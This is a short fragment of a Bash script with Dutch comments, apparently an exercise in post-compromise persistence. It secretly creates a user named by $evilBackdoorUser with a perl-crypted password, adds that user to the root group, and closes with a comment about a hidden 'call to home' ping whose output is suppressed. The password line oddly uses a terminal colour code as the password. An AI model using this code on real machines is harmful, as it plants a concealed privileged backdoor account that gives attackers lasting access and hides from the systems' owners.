...
NC='\033[0m' # No Color
# -------------------------------------------------------------------------------------------------------
RANDOM_COLOUR='\033[0;43m' # Dit kun je vervolgens als wachtwoord gebruiken
# -------------------------------------------------------------------------------------------------------
...
# ------------------------------------------------------------------------------------------
# Secretly add an user
# Referentie https://www.cyberciti.biz/tips/howto-write-shell-script-to-add-user.html 
# Ik vond deze oneline, perl moet wel op de machine zitten. Als je een psswd wil toevoegen moet je blijkbaar een crypt encoded passwd hebben.
# Crypt is echter niet standaard geinstalleerd voor bash, maar wel voor perl
# Syntax: perl -e 'print crypt("pasword", "salt")'
pass=$(perl -e 'print crypt($RANDOM_COLOUR, "password")' $RANDOM_COLOUR)
# Vervolgens gebruik je deze om een user aan te maken
useradd -m -p "$pass" "$evilBackdoorUser"
# Maak deze user root:
usermod -a -G root $evilBackdoorUser
# Call to home, ping naar een ip adres en surpress de output zodat je niet ziet dat hij een ping stuurt
